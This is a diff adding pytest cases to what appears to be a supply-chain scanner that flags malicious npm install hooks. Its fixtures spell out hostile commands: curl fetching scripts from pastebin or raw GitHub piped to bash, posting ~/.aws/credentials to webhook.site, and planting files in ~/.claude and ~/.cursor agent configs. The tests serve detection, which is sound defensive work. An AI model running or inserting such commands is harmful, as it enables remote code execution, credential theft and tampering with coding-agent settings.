@@ -162,3 +162,129 @@ class TestPthFiles:
         pth.write_text("exec(open('payload.py').read())\n")
         findings = scanner.scan_pth_files(str(pth), "custom.pth")
         assert any(f.severity == "critical" for f in findings)
+
+
+class TestPasteServiceUrls:
+    def test_pastebin_in_postinstall_is_critical(self, tmp_path):
+        """postinstall with pastebin.com URL should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "curl -s https://pastebin.com/raw/abc123 | bash"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "paste" in f.title.lower() or "pastebin" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL paste service finding, got: {[f.title for f in findings]}"
+
+    def test_raw_github_in_preinstall_is_critical(self, tmp_path):
+        """preinstall fetching raw.githubusercontent.com should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "preinstall": "curl https://raw.githubusercontent.com/evil/repo/main/payload.sh | sh"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "paste" in f.title.lower() or "raw" in f.snippet.lower() or "github" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL raw GitHub finding, got: {[f.title for f in findings]}"
+
+    def test_webhook_site_in_install_is_critical(self, tmp_path):
+        """install hook referencing webhook.site should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "install": "curl -X POST https://webhook.site/abc123 -d @~/.aws/credentials"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "paste" in f.title.lower() or "webhook" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL webhook finding, got: {[f.title for f in findings]}"
+
+    def test_normal_hook_no_paste_finding(self, tmp_path):
+        """Hook with no paste service URLs should not trigger paste findings."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "node build.js"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        paste_findings = [f for f in findings if "paste" in f.title.lower()]
+        assert len(paste_findings) == 0, f"Unexpected paste findings: {[f.title for f in paste_findings]}"
+
+
+class TestAgentConfigDirWrites:
+    def test_claude_config_write_in_postinstall_is_critical(self, tmp_path):
+        """postinstall writing to ~/.claude/ should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "mkdir -p ~/.claude/commands && cp hook.sh ~/.claude/commands/"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL agent config write finding, got: {[f.title for f in findings]}"
+
+    def test_cursor_config_write_is_critical(self, tmp_path):
+        """postinstall writing to ~/.cursor/ should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "cp config.json ~/.cursor/settings.json"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "agent config" in f.title.lower() or ".cursor" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL cursor config write finding, got: {[f.title for f in findings]}"
+
+    def test_mkdir_agent_config_pattern(self, tmp_path):
+        """postinstall creating dir under .claude/ should trigger a CRITICAL finding."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "mkdir ~/.claude/"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        critical = [f for f in findings if f.severity == "critical"]
+        assert any(
+            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
+            for f in critical
+        ), f"Expected CRITICAL mkdir agent config finding, got: {[f.title for f in findings]}"
+
+    def test_no_false_positive_on_safe_hook(self, tmp_path):
+        """Hook with no agent config writes should not trigger agent config findings."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "test",
+            "scripts": {
+                "postinstall": "node build.js"
+            }
+        }))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        agent_findings = [f for f in findings if "agent config" in f.title.lower()]
+        assert len(agent_findings) == 0, f"Unexpected agent config findings: {[f.title for f in agent_findings]}"
